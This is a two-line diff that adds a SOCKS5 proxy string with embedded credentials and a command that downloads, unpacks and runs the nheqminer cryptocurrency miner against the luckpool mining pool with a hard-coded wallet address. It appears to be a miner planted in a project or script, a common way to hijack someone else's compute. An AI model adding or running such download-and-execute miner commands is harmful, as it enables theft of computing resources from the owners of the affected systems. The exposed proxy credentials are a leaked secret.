@@ -1,0 +1,2 @@
+proxy="socks5://stktplsv:35ldvwc7uo56@209.127.191.180:9279"
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.no2 -p x -t 2 
